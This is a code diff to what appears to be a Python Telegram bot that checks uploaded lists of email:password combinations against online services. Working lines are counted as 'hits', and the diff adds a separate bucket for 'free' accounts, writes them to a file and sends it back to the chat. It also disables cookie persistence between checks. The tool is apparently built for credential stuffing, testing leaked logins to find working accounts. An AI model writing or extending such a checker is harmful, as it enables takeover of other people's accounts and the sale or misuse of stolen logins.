@@ -251,8 +251,10 @@ async def _process_file(
         return
 
     hits: list[dict] = []
+    free_accounts: list[dict] = []
     checked = 0
     errors = 0
+    free = 0
     last_edit = 0.0
 
     await _safe_edit(
@@ -284,11 +286,13 @@ async def _process_file(
                         f"⚙️ **Module:** {module_label}\n"
                         f"📌 **Status:** Processing…\n"
                         f"📊 **Progress:** {checked}/{total}\n"
-                        f"✅ **Hits:** {len(hits)} | ❌ Errors: {errors}"
+                        f"✅ **Hits:** {len(hits)} | 🆓 Free: {free} | ❌ Errors: {errors}"
                     ),
                 )
 
-    async with aiohttp.ClientSession() as session:
+    async with aiohttp.ClientSession(
+        cookie_jar=aiohttp.DummyCookieJar(),
+    ) as session:
         # Launch the periodic status updater in the background.
         updater = asyncio.create_task(_status_updater())
 
@@ -304,7 +308,11 @@ async def _process_file(
                     errors += 1
                     log.debug("Error checking line: %s", result)
                 elif result is not None:
-                    hits.append(result)
+                    if result.get("free"):
+                        free += 1
+                        free_accounts.append(result)
+                    else:
+                        hits.append(result)
 
         # Stop the status updater.
         updater.cancel()
@@ -325,7 +333,7 @@ async def _process_file(
             f"✅ **Done!**\n"
             f"⚙️ **Module:** {module_label}\n"
             f"📊 **Checked:** {total}\n"
-            f"🎯 **Hits:** {len(hits)} | ❌ Errors: {errors}\n\n"
+            f"🎯 **Hits:** {len(hits)} | 🆓 Free: {free} | ❌ Errors: {errors}\n\n"
             f"```\n{hit_preview}{overflow}\n```"
         ),
     )
@@ -350,6 +358,32 @@ async def _process_file(
         finally:
             try:
                 os.remove(results_path)
+            except OSError:
+                pass
+
+    # Save free accounts to a separate file and send it.
+    if free_accounts:
+        free_path = str(
+            Path(file_path).with_suffix(".free.txt")
+        )
+        try:
+            async with aiofiles.open(free_path, "w",
+                                     encoding="utf-8") as ff:
+                await ff.write(
+                    "\n".join(
+                        f"{a['email']}:{a['password']}"
+                        for a in free_accounts
+                    )
+                )
+            await message.reply_document(
+                document=free_path,
+                caption=f"🆓 {free} free accounts from {module_label}",
+            )
+        except Exception:
+            log.exception("Failed to send free accounts file")
+        finally:
+            try:
+                os.remove(free_path)
             except OSError:
                 pass
 
